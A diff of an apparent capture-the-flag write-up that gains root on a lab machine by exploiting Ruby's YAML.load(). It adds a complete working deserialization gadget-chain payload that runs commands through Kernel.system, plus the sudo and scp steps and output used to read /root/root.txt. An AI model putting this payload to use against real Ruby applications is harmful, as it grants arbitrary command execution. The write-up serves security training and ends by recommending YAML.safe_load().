@@ -147,7 +147,7 @@ b47ea5d5a17c22a8975f45d7386b1f37
 ```
 
 
-### linpeas
+### Enumeration
 
 Checking what we can run as sudo:
 
@@ -196,6 +196,144 @@ gems_file.each do |file_name, file_version|
 end
 ```
 
-[Hacktricks tells us](https://book.hacktricks.xyz/pentesting-web/deserialization/python-yaml-deserialization) that we can perform a deserialization attack via `YAML.load()`.
+[Hacktricks tells us](https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/) that we can perform a deserialization attack via `YAML.load()` in ruby.
 
-Let's check the `dependencies.yml` file:
+We need to craft a `dependencies.yml` file that will exploit the vulnerability in `YAML.load()`.
+
+
+### Crafting the exploit
+
+On our local machine, I create a file:
+
+```
+$ touch dependencies.yml
+```
+
+From the link above ([also here](https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/)), let's try and run an exploit.
+
+Pasting an exploit from the website, into `dependencies.yml`...
+
+```
+ ---
+ - !ruby/object:Gem::Installer
+     i: x
+ - !ruby/object:Gem::SpecFetcher
+     i: y
+ - !ruby/object:Gem::Requirement
+   requirements:
+     !ruby/object:Gem::Package::TarReader
+     io: &1 !ruby/object:Net::BufferedIO
+       io: &1 !ruby/object:Gem::Package::TarReader::Entry
+          read: 0
+          header: "abc"
+       debug_output: &1 !ruby/object:Net::WriteAdapter
+          socket: &1 !ruby/object:Gem::RequestSet
+              sets: !ruby/object:Net::WriteAdapter
+                  socket: !ruby/module 'Kernel'
+                  method_id: :system
+              git_set: whoami
+          method_id: :resolve 
+```
+
+Setting `git_set` as `whoami`, when run, it should show us `root` (as we are using sudo for our command.
+
+Transferring to our good old friend `henry` at `10.10.11.189`:
+
+```
+$ scp dependencies.yml henry@10.10.11.189:~/dependencies.yml
+henry@10.10.11.189's password: 
+dependencies.yml                                      100%  627     3.0KB/s   00:00  
+```
+
+Back to the ssh session...catting the contents of `dependencies.yml` on the remote machine, we see the transfer was successful.
+
+Running the command from earlier as sudo:
+
+```
+$ sudo /usr/bin/ruby /opt/update_dependencies.rb
+sh: 1: reading: not found
+root
+Traceback (most recent call last):
+        33: from /opt/update_dependencies.rb:17:in `<main>'
+        32: from /opt/update_dependencies.rb:10:in `list_from_file'
+        31: from /usr/lib/ruby/2.7.0/psych.rb:279:in `load'
+        30: from /usr/lib/ruby/2.7.0/psych/nodes/node.rb:50:in `to_ruby'
+        29: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept'
+        28: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept'
+        27: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit'
+        26: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:313:in `visit_Psych_Nodes_Document'
+        25: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept'
+        24: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept'
+        23: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit'
+        22: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:141:in `visit_Psych_Nodes_Sequence'
+        21: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in `register_empty'
+        20: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in `each'
+        19: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in `block in register_empty'
+        18: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept'
+        17: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept'
+        16: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit'
+        15: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:208:in `visit_Psych_Nodes_Mapping'
+        14: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:394:in `revive'
+        13: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:402:in `init_with'
+        12: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:218:in `init_with'
+        11: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:214:in `yaml_initialize'
+        10: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:299:in `fix_syck_default_key_in_requirements'
+         9: from /usr/lib/ruby/vendor_ruby/rubygems/package/tar_reader.rb:59:in `each'
+         8: from /usr/lib/ruby/vendor_ruby/rubygems/package/tar_header.rb:101:in `from'
+         7: from /usr/lib/ruby/2.7.0/net/protocol.rb:152:in `read'
+         6: from /usr/lib/ruby/2.7.0/net/protocol.rb:319:in `LOG'
+         5: from /usr/lib/ruby/2.7.0/net/protocol.rb:464:in `<<'
+         4: from /usr/lib/ruby/2.7.0/net/protocol.rb:458:in `write'
+         3: from /usr/lib/ruby/vendor_ruby/rubygems/request_set.rb:388:in `resolve'
+         2: from /usr/lib/ruby/2.7.0/net/protocol.rb:464:in `<<'
+         1: from /usr/lib/ruby/2.7.0/net/protocol.rb:458:in `write'
+/usr/lib/ruby/2.7.0/net/protocol.rb:458:in `system': no implicit conversion of nil into String (TypeError)
+```
+
+Awesome, it showed us we are `root` right at the start! Our Remote Code Execution (RCE) exploit worked! Let's get the flag.
+
+
+### Grabbing that sweet root flag
+
+We can probably assume the flag is called something along the lines of `flag.txt` or `root.txt`, but to be sure, let's get the `update_dependencies.rb` file to show us the contents of the `root` folder.
+
+Changing the `git_set` variable to `"ls -la /root"` and uploading and running, we get the following results...
+
+```
+$ sudo /usr/bin/ruby /opt/update_dependencies.rb
+sh: 1: reading: not found
+total 28
+drwx------  4 root root 4096 Nov 21 15:32 .
+drwxr-xr-x 18 root root 4096 Nov 21 15:11 ..
+lrwxrwxrwx  1 root root    9 Sep 26 05:04 .bash_history -> /dev/null
+-rw-r--r--  1 root root  571 Apr 10  2021 .bashrc
+drwxr-xr-x  3 root root 4096 Oct 26 08:28 .bundle
+drwxr-xr-x  3 root root 4096 Nov 21 15:13 .local
+-rw-r--r--  1 root root  161 Jul  9  2019 .profile
+-rw-r-----  1 root root   33 Feb  2 02:29 root.txt
+Traceback (most recent call last):
+        33: from /opt/update_dependencies.rb:17:in `<main>'
+        32: from /opt/update_dependencies.rb:10:in `list_from_file'
+        31: from /usr/lib/ruby/2.7.0/psych.rb:279:in `load'
+...
+...
+...
+```
+
+Nice, the file is called `root.txt` as we suspected. One again crafting the `dependencies.yml` file to say `git_set: "cat /root/root.txt"`, uploading and running, we get...
+
+```
+$ sudo /usr/bin/ruby /opt/update_dependencies.rb
+sh: 1: reading: not found
+f364ee72c9a3c1733e161d83ae923159
+Traceback (most recent call last):
+        33: from /opt/update_dependencies.rb:17:in `<main>'
+        32: from /opt/update_dependencies.rb:10:in `list_from_file'
+        31: from /usr/lib/ruby/2.7.0/psych.rb:279:in `load'
+...
+...
+...
+```
+
+We got the root flag! Next time you use ruby, don't use the `YAML.load()` function, instead go for `YAML.safe_load()`, which remove this RCE attack vector! ;)
+
